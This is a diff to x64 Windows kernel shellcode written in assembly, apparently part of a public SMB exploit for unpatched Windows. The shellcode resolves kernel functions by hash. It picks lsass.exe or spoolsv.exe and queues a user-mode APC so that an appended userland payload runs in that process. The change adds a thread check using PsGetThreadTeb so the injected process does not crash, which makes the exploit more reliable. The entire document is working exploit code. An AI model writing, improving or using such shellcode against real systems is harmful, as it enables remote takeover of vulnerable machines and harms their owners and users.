@@ -14,7 +14,6 @@
 ; - The shellcode do not allocate shadow stack if possible for minimal shellcode size.
 ;     It is ok because some Windows function does not require shadow stack.
 ; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
-;     This helps running exploit against same target repeatly more reliable.
 ; - The userland payload MUST be appened to this shellcode.
 ;
 ; Reference:
@@ -31,6 +30,7 @@ PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
 LSASS_EXE_HASH    EQU    0xc1fa6a5a
 SPOOLSV_EXE_HASH    EQU    0x3ee083d8
 ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
+PSGETTHREADTEB_HASH    EQU    0xcef84c3e
 KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
 KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
 PSGETPROCESSPEB_HASH    EQU    0xb818b848
@@ -329,14 +329,27 @@ found_target_process:
     ; try queueing APC then check KAPC member is more reliable.
 
 _insert_queue_apc_loop:
-    ; TODO: do not try to queue APC if TEB.ActivationContextStackPointer is NULL
-    ; if TEB.ActivationContextStackPointer is NULL, system will be reboot after inserting APC to queue
     ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
     mov rbx, [rbx+8]
 %ifndef COMPACT
     cmp rsi, rbx
     je _insert_queue_apc_loop   ; skip list head
 %endif
+
+    ; find start of ETHREAD address
+    ; set it to rdx to be used for KeInitializeApc() argument too
+    lea rdx, [rbx + r14]    ; ETHREAD
+    
+    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
+    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
+    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
+    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
+    ; Teb member is next to Queue member.
+    mov edi, PSGETTHREADTEB_HASH
+    call get_proc_addr
+    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)
+    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL
+    je _insert_queue_apc_loop
     
     ; KeInitializeApc(PKAPC,
     ;                 PKTHREAD,
@@ -353,7 +366,6 @@ _insert_queue_apc_loop:
     push 1      ; UserMode
     push rbp    ; userland shellcode (MUST NOT be NULL)
     push r8     ; NULL
-    lea rdx, [rbx + r14]    ; ETHREAD
     sub rsp, 0x20   ; shadow stack
     mov edi, KEINITIALIZEAPC_HASH
     call win_api_direct
